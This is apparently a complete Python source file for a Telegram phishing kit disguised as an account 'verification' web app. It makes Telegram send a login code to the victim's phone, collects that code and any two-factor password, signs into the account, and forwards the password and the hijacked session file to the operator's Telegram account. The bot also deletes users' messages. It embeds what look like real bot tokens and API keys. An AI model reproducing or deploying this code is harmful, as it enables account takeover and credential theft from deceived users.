import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from flask import Flask, render_template, request, jsonify
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json
import sys
import logging
from functools import wraps

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://itz-me-545-telegram.onrender.com')

# Log configuration
logger.info("=" * 60)
logger.info("🚀 Telegram WebApp Verification Bot")
logger.info("=" * 60)
logger.info(f"BOT_TOKEN: {BOT_TOKEN[:10]}...")
logger.info(f"USER_ID: {USER_ID}")
logger.info(f"API_ID: {API_ID}")
logger.info(f"API_HASH: {API_HASH[:10]}...")
logger.info(f"WEBHOOK_URL: {WEBHOOK_URL}")
logger.info("=" * 60)

# Initialize bot
try:
    bot = telebot.TeleBot(BOT_TOKEN)
    logger.info("✅ Bot initialized successfully")
except Exception as e:
    logger.error(f"❌ Failed to initialize bot: {e}")
    raise

# Storage
sessions = {}
session_expiry = 300  # 5 minutes
telegram_clients = {}

# Create directories
os.makedirs('sessions', exist_ok=True)
logger.info("✅ Directories created")

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            timeout=15
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop
        }
        logger.info(f"Created new Telegram client for {session_file}")
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        logger.info(f"Connecting to Telegram...")
        await client.connect()
        logger.info(f"Requesting OTP for {phone}")
        result = await client.send_code_request(phone)
        logger.info(f"OTP request successful for {phone}")
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except Exception as e:
        logger.error(f"Error sending OTP to {phone}: {e}")
        return {'success': False, 'error': str(e)}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        logger.info(f"Verifying OTP for {phone}")
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            logger.info(f"OTP verified successfully for {phone}, user: @{me.username}")
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            logger.info(f"OTP verified but 2FA required for {phone}")
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        logger.info(f"2FA needed for {phone}")
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        logger.warning(f"OTP expired for {phone}")
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        logger.warning(f"Invalid OTP for {phone}")
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        logger.error(f"Error verifying OTP for {phone}: {e}")
        error_str = str(e).lower()
        if 'password' in error_str or '2fa' in error_str:
            return {'success': True, 'requires_2fa': True}
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(client, password):
    try:
        logger.info("Verifying 2FA password")
        await client.sign_in(password=password)
        me = await client.get_me()
        logger.info(f"2FA verified successfully, user: @{me.username}")
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        logger.error(f"Error verifying 2FA: {e}")
        return {'success': False, 'error': str(e)}

def send_to_admin(phone, user_info=None, password=None):
    try:
        msg = f"📱 <b>NEW WEBAPP VERIFICATION</b>\n\n📞 Phone: {phone}"
        if user_info:
            msg += f"\n👤 User: {user_info.get('first_name', '')} {user_info.get('last_name', '')}"
            msg += f"\n🔗 @{user_info.get('username', 'N/A')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        if password:
            msg += f"\n🔐 2FA: {password}"
        
        msg += f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        bot.send_message(USER_ID, msg, parse_mode='HTML')
        logger.info(f"Admin notification sent for {phone}")
    except Exception as e:
        logger.error(f"Error sending to admin: {e}")

def cleanup_sessions():
    current_time = datetime.now()
    expired = []
    for session_id, session in sessions.items():
        if session['expiry'] < current_time:
            expired.append(session_id)
    for session_id in expired:
        logger.info(f"Cleaning expired session: {session_id}")
        del sessions[session_id]

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    logger.info("Serving main page")
    return render_template('index.html')

@app.route('/api/process-contact', methods=['POST'])
def process_contact():
    try:
        data = request.json
        logger.info(f"Processing contact: {data}")
        
        phone = data.get('phone', '').strip()
        first_name = data.get('first_name', '')
        last_name = data.get('last_name', '')
        
        if not phone:
            logger.error("No phone number provided")
            return jsonify({'success': False, 'error': 'No phone number'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Formatted phone: {phone}")
        
        session_id = generate_session_id()
        session_file = generate_session_file(phone)
        
        # Get Telegram client
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        # Send OTP
        logger.info(f"Sending OTP to {phone}")
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'expiry': datetime.now() + timedelta(seconds=session_expiry),
                'attempts': 0
            }
            
            logger.info(f"OTP sent successfully, session: {session_id}")
            
            # Notify admin
            try:
                admin_msg = f"📲 <b>New Contact</b>\n\n📱 {phone}\n👤 {first_name} {last_name}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                bot.send_message(USER_ID, admin_msg, parse_mode='HTML')
            except Exception as e:
                logger.error(f"Admin notification failed: {e}")
            
            return jsonify({
                'success': True,
                'session_id': session_id,
                'message': 'OTP sent'
            })
        else:
            logger.error(f"OTP send failed: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
            
    except Exception as e:
        logger.error(f"Error in process-contact: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        logger.info(f"Verifying OTP for session: {session_id}")
        
        if session_id not in sessions:
            logger.error(f"Session not found: {session_id}")
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            logger.error(f"Invalid OTP format: {otp}")
            return jsonify({'success': False, 'error': 'Invalid OTP format'})
        
        # Check attempts
        session['attempts'] += 1
        if session['attempts'] > 3:
            logger.error(f"Too many attempts for session: {session_id}")
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts'})
        
        logger.info(f"Attempt {session['attempts']} for {session['phone']}")
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                logger.info(f"2FA required for {session['phone']}")
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA required'
                })
            else:
                # Success
                logger.info(f"Successfully verified {session['phone']}")
                send_to_admin(session['phone'], result.get('user'))
                
                # Send session file
                if os.path.exists(session['session_file']):
                    try:
                        with open(session['session_file'], 'rb') as f:
                            bot.send_document(USER_ID, f, caption=f"Session: {session['phone']}")
                            logger.info(f"Session file sent for {session['phone']}")
                    except Exception as e:
                        logger.error(f"Error sending session file: {e}")
                
                del sessions[session_id]
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verified'
                })
        else:
            if result.get('code_expired'):
                logger.warning(f"OTP expired for {session['phone']}")
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Restart'})
            logger.warning(f"OTP verification failed: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        logger.error(f"Error in verify-otp: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        logger.info(f"Verifying 2FA for session: {session_id}")
        
        if session_id not in sessions:
            logger.error(f"Session not found: {session_id}")
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            logger.error("No password provided")
            return jsonify({'success': False, 'error': 'No password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            logger.info(f"2FA successful for {session['phone']}")
            send_to_admin(session['phone'], result.get('user'), password)
            
            # Send session file
            if os.path.exists(session['session_file']):
                try:
                    with open(session['session_file'], 'rb') as f:
                        bot.send_document(USER_ID, f, caption=f"2FA Session: {session['phone']}")
                except Exception as e:
                    logger.error(f"Error sending session file: {e}")
            
            del sessions[session_id]
            return jsonify({'success': True, 'message': '2FA verified'})
        else:
            logger.warning(f"2FA failed: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Wrong password')})
            
    except Exception as e:
        logger.error(f"Error in verify-2fa: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/complete', methods=['POST'])
def complete():
    try:
        data = request.json
        phone = data.get('phone', 'Unknown')
        
        logger.info(f"Verification complete for {phone}")
        
        # Final admin notification
        try:
            bot.send_message(
                USER_ID,
                f"✅ <b>VERIFICATION COMPLETE</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n🎉 Success!",
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Error sending final notification: {e}")
        
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error in complete: {e}")
        return jsonify({'success': False})

# ==================== BOT HANDLER ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    """Send WebApp button"""
    try:
        # Get the WebApp URL
        webapp_url = WEBHOOK_URL if WEBHOOK_URL else f"https://{request.host}"
        webapp_url = webapp_url.rstrip('/')
        
        logger.info(f"Sending WebApp button, URL: {webapp_url}")
        
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="🔐 Open Verification",
            web_app=types.WebAppInfo(url=f"{webapp_url}/")
        )
        keyboard.add(webapp_btn)
        
        # Send message
        sent_msg = bot.send_message(
            message.chat.id,
            "Click the button below to verify your account:",
            reply_markup=keyboard
        )
        
        # Schedule message deletion after 30 seconds
        def delete_message():
            try:
                time.sleep(30)
                bot.delete_message(message.chat.id, sent_msg.message_id)
                logger.info(f"Deleted start message for user {message.from_user.id}")
            except Exception as e:
                logger.error(f"Error deleting message: {e}")
        
        threading.Thread(target=delete_message, daemon=True).start()
        
    except Exception as e:
        logger.error(f"Error in start command: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Auto-delete contact messages"""
    try:
        logger.info(f"Contact received from user {message.from_user.id}")
        
        # Delete the contact message immediately
        bot.delete_message(message.chat.id, message.message_id)
        logger.info(f"Deleted contact message for user {message.from_user.id}")
        
        # Send WebApp button again
        start_command(message)
        
    except Exception as e:
        logger.error(f"Error handling contact: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages by deleting them"""
    try:
        if message.text and not message.text.startswith('/'):
            bot.delete_message(message.chat.id, message.message_id)
            logger.info(f"Deleted random message from user {message.from_user.id}")
    except Exception as e:
        logger.error(f"Error deleting message: {e}")

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Set up webhook for bot"""
    try:
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/bot/{BOT_TOKEN}"
            bot.set_webhook(url=webhook_url)
            logger.info(f"✅ Webhook set: {webhook_url}")
        else:
            logger.warning("⚠️ No WEBHOOK_URL set, using polling")
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")

@app.route(f'/bot/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 403

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions periodically"""
    while True:
        time.sleep(60)
        try:
            cleanup_sessions()
        except Exception as e:
            logger.error(f"Error in cleanup: {e}")

# ==================== MAIN ====================
if __name__ == '__main__':
    # Start cleanup thread
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    # Set up webhook or polling
    port = int(os.environ.get('PORT', 10000))
    
    if WEBHOOK_URL:
        setup_webhook()
        logger.info(f"🌐 WebApp URL: {WEBHOOK_URL}")
        logger.info("🤖 Bot running via webhook")
        app.run(host='0.0.0.0', port=port, debug=False)
    else:
        logger.info("🌐 Local development mode")
        logger.info(f"📱 WebApp URL: http://localhost:{port}")
        logger.info("🤖 Bot running via polling")
        
        # Start bot in separate thread
        def run_bot():
            try:
                bot.polling(none_stop=True, timeout=20)
            except Exception as e:
                logger.error(f"Bot error: {e}")
                time.sleep(5)
                run_bot()
        
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        # Run Flask
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
